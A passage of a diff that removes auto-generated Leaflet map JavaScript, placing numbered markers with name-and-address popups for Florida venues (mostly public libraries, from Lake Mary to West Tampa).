-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_4f217fd88104a269c5fd9896d9c6d599.setIcon(div_icon_dd8fde796fbfe6b005fa03a2eb1a864c);
-            
-    
-            var marker_83765d82ff37e1767775e1feb0a20db8 = L.marker(
-                [28.76, -81.3548],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_2fafea50028393c4ce630bc1af2fd072 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            13\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_a9f6716e873e416c02ec515fbe462517 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_7ee2358b68caca2b378461ccce5d62b8 = $(`<div id="html_7ee2358b68caca2b378461ccce5d62b8" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>13. Lake Mary</b><br>       North West Library<br>       580 Green Way Blvd<br>       Lake Mary, FL 32746     </div>     </div>`)[0];
-                popup_a9f6716e873e416c02ec515fbe462517.setContent(html_7ee2358b68caca2b378461ccce5d62b8);
-            
-        
-
-        marker_83765d82ff37e1767775e1feb0a20db8.bindPopup(popup_a9f6716e873e416c02ec515fbe462517)
-        ;
-
-        
-    
-    
-            marker_83765d82ff37e1767775e1feb0a20db8.bindTooltip(
-                `<div>
-                     13. Lake Mary — North West Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_83765d82ff37e1767775e1feb0a20db8.setIcon(div_icon_2fafea50028393c4ce630bc1af2fd072);
-            
-    
-            var marker_35c81f27804a62b693e63d9600933ff7 = L.marker(
-                [28.819, -81.647],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_54b28f0e26d8b3befa8f214bc2985943 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            14\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_26402ba71258a2d22425503eb37e31fe = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_75ee5d8c01ee6aef0bd69fbcbcbde697 = $(`<div id="html_75ee5d8c01ee6aef0bd69fbcbcbde697" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>14. Mount Dora</b><br>       W.T. Bland Library<br>       1995 N Donnelly St<br>       Mount Dora, FL 32757     </div>     </div>`)[0];
-                popup_26402ba71258a2d22425503eb37e31fe.setContent(html_75ee5d8c01ee6aef0bd69fbcbcbde697);
-            
-        
-
-        marker_35c81f27804a62b693e63d9600933ff7.bindPopup(popup_26402ba71258a2d22425503eb37e31fe)
-        ;
-
-        
-    
-    
-            marker_35c81f27804a62b693e63d9600933ff7.bindTooltip(
-                `<div>
-                     14. Mount Dora — W.T. Bland Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_35c81f27804a62b693e63d9600933ff7.setIcon(div_icon_54b28f0e26d8b3befa8f214bc2985943);
-            
-    
-            var marker_f70b0352f3353033710eb58fb8244c7f = L.marker(
-                [29.118, -82.03],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_af678fd74389f2aee525e494af949a68 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            15\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_e4da0d7fe1eb9db8c29c3fb85c4a8600 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_4394c47c96b44040edb7dfe0dde0fd58 = $(`<div id="html_4394c47c96b44040edb7dfe0dde0fd58" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>15. Ocala</b><br>       Silver Springs Rec Center<br>       590 Silver Rd<br>       Ocala, FL 34472     </div>     </div>`)[0];
-                popup_e4da0d7fe1eb9db8c29c3fb85c4a8600.setContent(html_4394c47c96b44040edb7dfe0dde0fd58);
-            
-        
-
-        marker_f70b0352f3353033710eb58fb8244c7f.bindPopup(popup_e4da0d7fe1eb9db8c29c3fb85c4a8600)
-        ;
-
-        
-    
-    
-            marker_f70b0352f3353033710eb58fb8244c7f.bindTooltip(
-                `<div>
-                     15. Ocala — Silver Springs Rec Center
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_f70b0352f3353033710eb58fb8244c7f.setIcon(div_icon_af678fd74389f2aee525e494af949a68);
-            
-    
-            var marker_791d0be2a9678794dde383545ed158f5 = L.marker(
-                [29.12, -80.984],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_5c7e7b0a2f0c74b96e38f2bed43a8825 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            16\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_7236be36df6e1526d48ac97c4e99ec47 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_2242de3ebf09a4e13ec69e9997a9c2a6 = $(`<div id="html_2242de3ebf09a4e13ec69e9997a9c2a6" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>16. Port Orange</b><br>       Elks Club #2723<br>       5207 S Ridgewood Ave<br>       Port Orange, FL 32127     </div>     </div>`)[0];
-                popup_7236be36df6e1526d48ac97c4e99ec47.setContent(html_2242de3ebf09a4e13ec69e9997a9c2a6);
-            
-        
-
-        marker_791d0be2a9678794dde383545ed158f5.bindPopup(popup_7236be36df6e1526d48ac97c4e99ec47)
-        ;
-
-        
-    
-    
-            marker_791d0be2a9678794dde383545ed158f5.bindTooltip(
-                `<div>
-                     16. Port Orange — Elks Club #2723
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_791d0be2a9678794dde383545ed158f5.setIcon(div_icon_5c7e7b0a2f0c74b96e38f2bed43a8825);
-            
-    
-            var marker_82a2ee9690efc9fad8c60b67950739f4 = L.marker(
-                [27.6, -81.52],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_ddc920c2f48fdb41361a887d70c9033e = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            17\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_86a5de13d7cdd0d9c42ffe1e746e2bce = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_83a193215c3be1f54fd7573e2a0deb5d = $(`<div id="html_83a193215c3be1f54fd7573e2a0deb5d" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>17. Avon Park</b><br>       American Legion Post 69<br>       1301 W Bell St<br>       Avon Park, FL 33825     </div>     </div>`)[0];
-                popup_86a5de13d7cdd0d9c42ffe1e746e2bce.setContent(html_83a193215c3be1f54fd7573e2a0deb5d);
-            
-        
-
-        marker_82a2ee9690efc9fad8c60b67950739f4.bindPopup(popup_86a5de13d7cdd0d9c42ffe1e746e2bce)
-        ;
-
-        
-    
-    
-            marker_82a2ee9690efc9fad8c60b67950739f4.bindTooltip(
-                `<div>
-                     17. Avon Park — American Legion Post 69
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_82a2ee9690efc9fad8c60b67950739f4.setIcon(div_icon_ddc920c2f48fdb41361a887d70c9033e);
-            
-    
-            var marker_3f63fb732706397c1e48e9c73e20a605 = L.marker(
-                [27.88, -81.843],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_34dbac62065ebcd3e13fcce38a73547e = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            18\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_ea7e29191412c96e9b55e06240297616 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_0e4488f678b7ac0bdb40cb6c668a2a3e = $(`<div id="html_0e4488f678b7ac0bdb40cb6c668a2a3e" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>18. Bartow</b><br>       Bartow Library<br>       2150 S Broadway Ave<br>       Bartow, FL 33830     </div>     </div>`)[0];
-                popup_ea7e29191412c96e9b55e06240297616.setContent(html_0e4488f678b7ac0bdb40cb6c668a2a3e);
-            
-        
-
-        marker_3f63fb732706397c1e48e9c73e20a605.bindPopup(popup_ea7e29191412c96e9b55e06240297616)
-        ;
-
-        
-    
-    
-            marker_3f63fb732706397c1e48e9c73e20a605.bindTooltip(
-                `<div>
-                     18. Bartow — Bartow Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_3f63fb732706397c1e48e9c73e20a605.setIcon(div_icon_34dbac62065ebcd3e13fcce38a73547e);
-            
-    
-            var marker_1688ce75f7c530a2df17b4bede18efa5 = L.marker(
-                [28.916, -82.459],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_f05f6d71321c6db78bdc652293f81d5a = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            19\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_064105b6ff95e5bcdfeda803a4067fdc = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_521c1ccb5f6edc412efaab23f2ab2849 = $(`<div id="html_521c1ccb5f6edc412efaab23f2ab2849" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>19. Beverly Hills</b><br>       Central Ridge Library<br>       425 West Roosevelt Blvd<br>       Beverly Hills, FL 34465     </div>     </div>`)[0];
-                popup_064105b6ff95e5bcdfeda803a4067fdc.setContent(html_521c1ccb5f6edc412efaab23f2ab2849);
-            
-        
-
-        marker_1688ce75f7c530a2df17b4bede18efa5.bindPopup(popup_064105b6ff95e5bcdfeda803a4067fdc)
-        ;
-
-        
-    
-    
-            marker_1688ce75f7c530a2df17b4bede18efa5.bindTooltip(
-                `<div>
-                     19. Beverly Hills — Central Ridge Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_1688ce75f7c530a2df17b4bede18efa5.setIcon(div_icon_f05f6d71321c6db78bdc652293f81d5a);
-            
-    
-            var marker_8ec5293c16b56d6722f18db43954efc5 = L.marker(
-                [28.347, -81.676],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_e79a8f95fbd3570ba5ff61280ece3176 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            20\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_02b63ec748d9cb9b93ffe3670d9a9120 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_e71d477debb05ec2a2d19682b62c6591 = $(`<div id="html_e71d477debb05ec2a2d19682b62c6591" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>20. Clermont</b><br>       Cagan Crossings Library<br>       16729 Cagan Oaks<br>       Clermont, FL 34714     </div>     </div>`)[0];
-                popup_02b63ec748d9cb9b93ffe3670d9a9120.setContent(html_e71d477debb05ec2a2d19682b62c6591);
-            
-        
-
-        marker_8ec5293c16b56d6722f18db43954efc5.bindPopup(popup_02b63ec748d9cb9b93ffe3670d9a9120)
-        ;
-
-        
-    
-    
-            marker_8ec5293c16b56d6722f18db43954efc5.bindTooltip(
-                `<div>
-                     20. Clermont — Cagan Crossings Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_8ec5293c16b56d6722f18db43954efc5.setIcon(div_icon_e79a8f95fbd3570ba5ff61280ece3176);
-            
-    
-            var marker_8babfcf6b80f4543f4be4dc434cdbaf6 = L.marker(
-                [28.355, -80.727],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_71d8925e0f64d68317aa495ac75950b6 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            21\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_3efa315410b47be020d7b132e3f18ed6 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_5c8b58d5b7aa936022b77b984a85df2b = $(`<div id="html_5c8b58d5b7aa936022b77b984a85df2b" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>21. Cocoa</b><br>       Catherine S. Rood Library<br>       308 Forrest Ave<br>       Cocoa, FL 32922     </div>     </div>`)[0];
-                popup_3efa315410b47be020d7b132e3f18ed6.setContent(html_5c8b58d5b7aa936022b77b984a85df2b);
-            
-        
-
-        marker_8babfcf6b80f4543f4be4dc434cdbaf6.bindPopup(popup_3efa315410b47be020d7b132e3f18ed6)
-        ;
-
-        
-    
-    
-            marker_8babfcf6b80f4543f4be4dc434cdbaf6.bindTooltip(
-                `<div>
-                     21. Cocoa — Catherine S. Rood Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_8babfcf6b80f4543f4be4dc434cdbaf6.setIcon(div_icon_71d8925e0f64d68317aa495ac75950b6);
-            
-    
-            var marker_2308ec3e9953fc5e7317fed518b36bcb = L.marker(
-                [28.022, -81.62],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_20561a59b85067617d5f45b8ebdc40f6 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            22\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_08665a3c3616a4c0363fb6eda2e44a16 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_7d24017ad66993a6756990d17e961dd4 = $(`<div id="html_7d24017ad66993a6756990d17e961dd4" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>22. Dundee</b><br>       Dundee Library<br>       202 E Main St<br>       Dundee, FL 33838     </div>     </div>`)[0];
-                popup_08665a3c3616a4c0363fb6eda2e44a16.setContent(html_7d24017ad66993a6756990d17e961dd4);
-            
-        
-
-        marker_2308ec3e9953fc5e7317fed518b36bcb.bindPopup(popup_08665a3c3616a4c0363fb6eda2e44a16)
-        ;
-
-        
-    
-    
-            marker_2308ec3e9953fc5e7317fed518b36bcb.bindTooltip(
-                `<div>
-                     22. Dundee — Dundee Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_2308ec3e9953fc5e7317fed518b36bcb.setIcon(div_icon_20561a59b85067617d5f45b8ebdc40f6);
-            
-    
-            var marker_a2b504f74ee75a374ffe788bd14fc7e5 = L.marker(
-                [28.292, -81.404],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_05a0fbc2c717a6aab9eef9cd865406ad = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            23\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_4cf8528adf9ba32e81d4f9ffe43e034c = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_1ff573ad688b03e635f82e074fcfe4a1 = $(`<div id="html_1ff573ad688b03e635f82e074fcfe4a1" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>23. Kissimmee</b><br>       Hart Memorial Library<br>       211 E Dakin Ave<br>       Kissimmee, FL 34741     </div>     </div>`)[0];
-                popup_4cf8528adf9ba32e81d4f9ffe43e034c.setContent(html_1ff573ad688b03e635f82e074fcfe4a1);
-            
-        
-
-        marker_a2b504f74ee75a374ffe788bd14fc7e5.bindPopup(popup_4cf8528adf9ba32e81d4f9ffe43e034c)
-        ;
-
-        
-    
-    
-            marker_a2b504f74ee75a374ffe788bd14fc7e5.bindTooltip(
-                `<div>
-                     23. Kissimmee — Hart Memorial Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_a2b504f74ee75a374ffe788bd14fc7e5.setIcon(div_icon_05a0fbc2c717a6aab9eef9cd865406ad);
-            
-    
-            var marker_144bd7573614667bec8dfbcaac4ff237 = L.marker(
-                [27.998, -82.276],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_881b924a502978150d75d24564841a80 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            24\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_96f5350dac787221377d6ee350b73e8e = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_8be3403ff5c01566a0db549fcd3859f0 = $(`<div id="html_8be3403ff5c01566a0db549fcd3859f0" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>24. Seffner</b><br>       Seffner-Mango Library<br>       410 Kingsway Rd<br>       Seffner, FL 33584     </div>     </div>`)[0];
-                popup_96f5350dac787221377d6ee350b73e8e.setContent(html_8be3403ff5c01566a0db549fcd3859f0);
-            
-        
-
-        marker_144bd7573614667bec8dfbcaac4ff237.bindPopup(popup_96f5350dac787221377d6ee350b73e8e)
-        ;
-
-        
-    
-    
-            marker_144bd7573614667bec8dfbcaac4ff237.bindTooltip(
-                `<div>
-                     24. Seffner — Seffner-Mango Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_144bd7573614667bec8dfbcaac4ff237.setIcon(div_icon_881b924a502978150d75d24564841a80);
-            
-    
-            var marker_4a65637764698f618a1fb233b1e1c74c = L.marker(
-                [28.1435, -82.328],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_81de06c65ba999f97ce1ae991524182d = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            25\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_bac50880ba4903e4f262ef05f73144cc = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_0f99b139fd5d253b03e03eebe2027936 = $(`<div id="html_0f99b139fd5d253b03e03eebe2027936" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>25. Tampa</b><br>       New Tampa Regional Library<br>       10001 Cross Creek Blvd<br>       Tampa, FL 33647     </div>     </div>`)[0];
-                popup_bac50880ba4903e4f262ef05f73144cc.setContent(html_0f99b139fd5d253b03e03eebe2027936);
-            
-        
-
-        marker_4a65637764698f618a1fb233b1e1c74c.bindPopup(popup_bac50880ba4903e4f262ef05f73144cc)
-        ;
-
-        
-    
-    
-            marker_4a65637764698f618a1fb233b1e1c74c.bindTooltip(
-                `<div>
-                     25. Tampa — New Tampa Regional Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_4a65637764698f618a1fb233b1e1c74c.setIcon(div_icon_81de06c65ba999f97ce1ae991524182d);
-            
-    
-            var marker_fcc37e7795479953ff9f2120d68664a0 = L.marker(
-                [28.146, -82.757],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_8b0c3947e0979cd5d3857b081508c264 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            26\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_b9a4c561b7aca8f1c333f25b130f64bc = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_4ea6c9e0bea4d002be0ce081ea2496b9 = $(`<div id="html_4ea6c9e0bea4d002be0ce081ea2496b9" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>26. Tarpon Springs</b><br>       Consignment Emporium<br>       9 S Safford Ave<br>       Tarpon Springs, FL 34689     </div>     </div>`)[0];
-                popup_b9a4c561b7aca8f1c333f25b130f64bc.setContent(html_4ea6c9e0bea4d002be0ce081ea2496b9);
-            
-        
-
-        marker_fcc37e7795479953ff9f2120d68664a0.bindPopup(popup_b9a4c561b7aca8f1c333f25b130f64bc)
-        ;
-
-        
-    
-    
-            marker_fcc37e7795479953ff9f2120d68664a0.bindTooltip(
-                `<div>
-                     26. Tarpon Springs — Consignment Emporium
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_fcc37e7795479953ff9f2120d68664a0.setIcon(div_icon_8b0c3947e0979cd5d3857b081508c264);
-            
-    
-            var marker_75695aa8996d4c1157484d7ed4e98247 = L.marker(
-                [28.062, -82.296],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_7f82448bb8b76bb8fd597a88d9645c8d = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            27\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_32afdae917178b3ac329c7d83c15c285 = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_a64c22ac1e4246312a834780cd08c4a8 = $(`<div id="html_a64c22ac1e4246312a834780cd08c4a8" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>27. Thonotosassa</b><br>       Thonotosassa Library<br>       10715 Main St<br>       Thonotosassa, FL 33592     </div>     </div>`)[0];
-                popup_32afdae917178b3ac329c7d83c15c285.setContent(html_a64c22ac1e4246312a834780cd08c4a8);
-            
-        
-
-        marker_75695aa8996d4c1157484d7ed4e98247.bindPopup(popup_32afdae917178b3ac329c7d83c15c285)
-        ;
-
-        
-    
-    
-            marker_75695aa8996d4c1157484d7ed4e98247.bindTooltip(
-                `<div>
-                     27. Thonotosassa — Thonotosassa Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_75695aa8996d4c1157484d7ed4e98247.setIcon(div_icon_7f82448bb8b76bb8fd597a88d9645c8d);
-            
-    
-            var marker_47e07e9842bc2bf21d4d6e403ed458b5 = L.marker(
-                [28.238, -82.252],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_f70890769e5e20e376b2fb855d825226 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            28\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_221fd2355d78a9bcd9c89c133695eaaf = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_e218888a76a74a5807f0045e22ddf752 = $(`<div id="html_e218888a76a74a5807f0045e22ddf752" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>28. Wesley Chapel</b><br>       New River Library<br>       34043 FL-54<br>       Wesley Chapel, FL 33543     </div>     </div>`)[0];
-                popup_221fd2355d78a9bcd9c89c133695eaaf.setContent(html_e218888a76a74a5807f0045e22ddf752);
-            
-        
-
-        marker_47e07e9842bc2bf21d4d6e403ed458b5.bindPopup(popup_221fd2355d78a9bcd9c89c133695eaaf)
-        ;
-
-        
-    
-    
-            marker_47e07e9842bc2bf21d4d6e403ed458b5.bindTooltip(
-                `<div>
-                     28. Wesley Chapel — New River Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_47e07e9842bc2bf21d4d6e403ed458b5.setIcon(div_icon_f70890769e5e20e376b2fb855d825226);
-            
-    
-            var marker_012912c771af91d3490c37098079c24d = L.marker(
-                [28.01, -82.565],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_2f426c1897d3c41cd8108030abaf7c18 = L.divIcon({
-  "html": "\n        \u003cdiv style=\"\n            background:#ffffff;\n            border:2px solid #222;\n            border-radius:50%;\n            width:28px;\n            height:28px;\n            text-align:center;\n            line-height:24px;\n            font-weight:700;\n            font-size:12px;\n            color:#111;\n            box-shadow:0 1px 4px rgba(0,0,0,.35);\"\u003e\n            29\n        \u003c/div\u003e\n        ",
-  "className": "empty",
-});
-        
-    
-        var popup_294a4148ec02c0951c7e67846cd90dfd = L.popup({
-  "maxWidth": 280,
-});
-
-        
-            
-                var html_a96324266c8eadb7cdbe341c6404d47b = $(`<div id="html_a96324266c8eadb7cdbe341c6404d47b" style="width: 100.0%; height: 100.0%;">     <div style="font-family: Arial; font-size: 13px;">       <b>29. West Tampa</b><br>       Town 'N Country Library<br>       7606 Paula Dr<br>       West Tampa, FL 33615     </div>     </div>`)[0];
-                popup_294a4148ec02c0951c7e67846cd90dfd.setContent(html_a96324266c8eadb7cdbe341c6404d47b);
-            
-        
-
-        marker_012912c771af91d3490c37098079c24d.bindPopup(popup_294a4148ec02c0951c7e67846cd90dfd)
-        ;
-
-        
-    
-    
-            marker_012912c771af91d3490c37098079c24d.bindTooltip(
-                `<div>
-                     29. West Tampa — Town 'N Country Library
-                 </div>`,
-                {
-  "sticky": true,
-}
-            );
-        
-    
-                marker_012912c771af91d3490c37098079c24d.setIcon(div_icon_2f426c1897d3c41cd8108030abaf7c18);
-            
-    
-            var marker_caef8552ed16fd871121fb04f6e64444 = L.marker(
-                [28.229, -80.698],
-                {
-}
-            ).addTo(map_cdeaa2c39c1ee89fddb41611cba312c8);
-        
-    
-            var div_icon_5cb26bd96b7925aa79bb03a31a8bfd55 = L.divIcon({
